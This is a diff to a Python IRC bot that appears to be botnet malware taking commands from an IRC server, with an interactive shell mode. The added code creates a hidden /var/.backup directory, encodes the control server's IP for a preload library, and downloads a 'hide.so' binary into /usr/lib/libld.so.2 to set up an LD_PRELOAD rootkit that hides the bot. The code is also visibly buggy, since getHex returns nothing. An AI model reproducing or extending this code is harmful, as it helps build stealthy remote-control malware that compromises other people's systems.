@@ -39,17 +39,37 @@ INTERACT = [0, 1, 1] 	#index one is the boolean for if the interactive shell is 
 irc = ""
 
 #TEST THIS TO MAKE SURE IT WORKS
-def initPreloader():
+def initPreloader(server, port):
 	request = execute("mkdir /var/.backup")
+
+	#get server ip as hex and put in file for the preload library
+	output = getHex(server, port)
+	with open('/var/.backup/ip', 'w') as f:
+		f.write(output)
+
 	installPreloader()
+
+def getHex(server, port):
+	#perform dns lookup on server
+	ip = socket.gethostbyname(server)
+	nums = ip.split(".")
+	newStr = ""
+	if sys.byteorder == 'little': #little endian so reverse list
+		nums = nums.reverse()
+
+	for num in nums:
+		newStr +=hex(int(num)).replace("0x", "")
+
+	newStr += ":" + hex(int(port))
 
 def installPreloader(): #downloads preload binary
 	response = urllib2.urlopen('https://github.com/Blizzo/IRCbot/blob/master/hide.so')
 	data = response.read()
-	f = open('/usr/lib/libld.so.2')
-	f.write(data)
-	f.close()
-	sendData("The preloader was installed.")
+	with open('/usr/lib/libld.so.2', 'w') as f:
+		f.write(data)
+
+	#STILL NEED to add LD_PRELOAD environment variable
+	#sendData("The preloader was installed.")
 
 def generateNick(operatingSystem): #generates a nick for the server
 	if not operatingSystem:
@@ -533,7 +553,7 @@ def main():
 							#index three is mode indicator. if >0 we are in shell mode, if <0 we are in functions mode
 
 	#IRC Settings
-	server = "jacksonsadowski.com"
+	server = "MY_IRC_SERVER.NET"
 	port = 6667
 	nick = generateNick(operatingSystem)
 
@@ -546,7 +566,7 @@ def main():
 	#UNCOMMENT THIS SECTION IN PRODUCTION
 	#if linux, install the preloader
 	#if (operatingSystem == "linux"):
-		#initPreloader()
+		#initPreloader(server, port)
 
 	#infinite loop to listen for messages aka commands
 	while 1:
